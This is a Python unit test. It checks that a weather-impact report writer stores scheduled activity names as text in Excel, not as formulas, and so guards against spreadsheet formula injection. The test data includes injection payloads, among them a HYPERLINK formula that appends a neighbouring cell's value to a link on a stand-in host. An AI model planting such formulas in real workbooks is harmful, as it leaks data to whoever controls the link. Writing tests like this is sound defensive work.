"""Activity names in the weather report must be stored as text, not formulas.

ScheduleWeatherOptimizer.generate_weather_report copies each scheduled
activity name onto the Activities sheet and, when a day is a weather risk,
onto the Risk_Days sheet. openpyxl treats a string longer than one character
that starts with "=" as a formula, so a name planted in schedule data is
calculated when the workbook is opened.

These tests load the implementation from the skill document and fail while
that copy is unsanitized. Prefixes "+", "-", and "@" are not covered: this
writer stores them as strings, so they do not become formulas.
"""

import contextlib
import io
import re
import tempfile
import unittest
import zipfile
from datetime import date, datetime
from pathlib import Path
from xml.etree import ElementTree as ET

import openpyxl

SKILL_PATH = (
    Path(__file__).resolve().parents[1]
    / "5_DDC_Innovative"
    / "weather-impact-analysis"
    / "SKILL.md"
)

MAIN_NS = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
DOC_REL_NS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
PKG_REL_NS = "http://schemas.openxmlformats.org/package/2006/relationships"

# References the End column on Activities and the reason column on Risk_Days.
# Either way the formula reads a neighboring cell once the sheet is calculated.
CELL_REFERENCE = "=C2"
# Pulls the same neighboring cell into a link target.
LINK_REFERENCE = '=HYPERLINK("http://example.invalid/?d="&C2,"view")'


def load_skill_namespace():
    """Execute the skill's Python blocks in one namespace, in document order."""
    source = SKILL_PATH.read_text(encoding="utf-8")
    blocks = re.findall(r"```python\n(.*?)```", source, re.DOTALL)
    if len(blocks) < 4:
        raise AssertionError(f"expected the skill's code blocks, found {len(blocks)}")
    namespace = {"__name__": "weather_impact_analysis_skill"}
    stdout = io.StringIO()
    with contextlib.redirect_stdout(stdout):
        for index, block in enumerate(blocks):
            executable = compile(block, f"{SKILL_PATH}:block{index}", "exec")
            exec(executable, namespace)
    return namespace


def worksheet_formulas(path):
    """Return (sheet name, cell, formula text) for every formula in the workbook."""
    found = []
    with zipfile.ZipFile(path) as workbook_zip:
        workbook = ET.fromstring(workbook_zip.read("xl/workbook.xml"))
        relationships = ET.fromstring(workbook_zip.read("xl/_rels/workbook.xml.rels"))
        targets = {
            rel.attrib["Id"]: rel.attrib["Target"]
            for rel in relationships.findall(f"{{{PKG_REL_NS}}}Relationship")
        }
        sheets = workbook.findall(f"{{{MAIN_NS}}}sheets/{{{MAIN_NS}}}sheet")
        for sheet in sheets:
            name = sheet.attrib["name"]
            relation_id = sheet.attrib[f"{{{DOC_REL_NS}}}id"]
            target = targets[relation_id].lstrip("/")
            if target.startswith("../"):
                target = target[3:]
            if not target.startswith("xl/"):
                target = "xl/" + target
            root = ET.fromstring(workbook_zip.read(target))
            for cell in root.findall(f".//{{{MAIN_NS}}}c"):
                formula = cell.find(f"{{{MAIN_NS}}}f")
                if formula is not None:
                    found.append((name, cell.attrib.get("r"), formula.text or ""))
    return found


def column_cells(worksheet, header):
    column = None
    for cell in worksheet[1]:
        if cell.value == header:
            column = cell.column
            break
    if column is None:
        raise AssertionError(f"{worksheet.title} has no {header!r} column")
    return [
        worksheet.cell(row=row, column=column)
        for row in range(2, worksheet.max_row + 1)
    ]


class ForecastStub:
    """Weather days only. Activity names never pass through this object."""

    def __init__(self, days):
        self._days = days

    def get_forecast(self, latitude, longitude, days=14):
        return list(self._days)


class WeatherReportFormulaInjectionTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.skill = load_skill_namespace()

    def _report(self, activity_names, output_path):
        skill = self.skill
        day = date(2026, 6, 1)
        forecast = [
            skill["DailyForecast"](
                date=day,
                temp_high=20.0,
                temp_low=10.0,
                sunrise=datetime(2026, 6, 1, 6, 0),
                sunset=datetime(2026, 6, 1, 18, 0),
                precipitation_total=15.0,
                precipitation_probability=90.0,
                primary_condition=skill["WeatherCondition"].RAIN,
            )
        ]
        # Roofing is rain-sensitive with a 0 mm precipitation limit, so this
        # forecast records a risk day and the report writes both sheets.
        schedule = [
            skill["ScheduledActivity"](
                activity_id=f"SUB-{index}",
                activity_name=name,
                activity_type="roofing",
                planned_start=day,
                planned_end=day,
                duration_days=1,
                is_critical=True,
            )
            for index, name in enumerate(activity_names, start=1)
        ]
        optimizer = skill["ScheduleWeatherOptimizer"](
            ForecastStub(forecast),
            skill["ActivityWeatherAnalyzer"](),
        )
        return optimizer.generate_weather_report(
            schedule, (40.0, -74.0), str(output_path)
        )

    def test_formula_activity_names_are_text_on_activities_and_risk_days(self):
        payloads = [CELL_REFERENCE, LINK_REFERENCE]
        with tempfile.TemporaryDirectory() as directory:
            output_path = Path(directory) / "weather-report.xlsx"
            self._report(payloads, output_path)

            formulas = worksheet_formulas(output_path)
            self.assertEqual(
                formulas,
                [],
                "workbook contains formula cells written from activity names",
            )

            workbook = openpyxl.load_workbook(output_path)
            written = column_cells(workbook["Activities"], "Activity")
            written.extend(column_cells(workbook["Risk_Days"], "activity"))
            self.assertEqual(len(written), len(payloads) * 2)

            for cell in written:
                self.assertNotEqual(cell.data_type, "f", cell.coordinate)
                self.assertIsInstance(cell.value, str)
                matched = [payload for payload in payloads if payload in cell.value]
                self.assertEqual(
                    len(matched),
                    1,
                    f"{cell.coordinate} value {cell.value!r} is not an activity name",
                )
                # A single leading apostrophe is the usual text-prefix sanitizer.
                visible = cell.value[1:] if cell.value.startswith("'") else cell.value
                self.assertIn(visible, payloads)


if __name__ == "__main__":
    unittest.main()
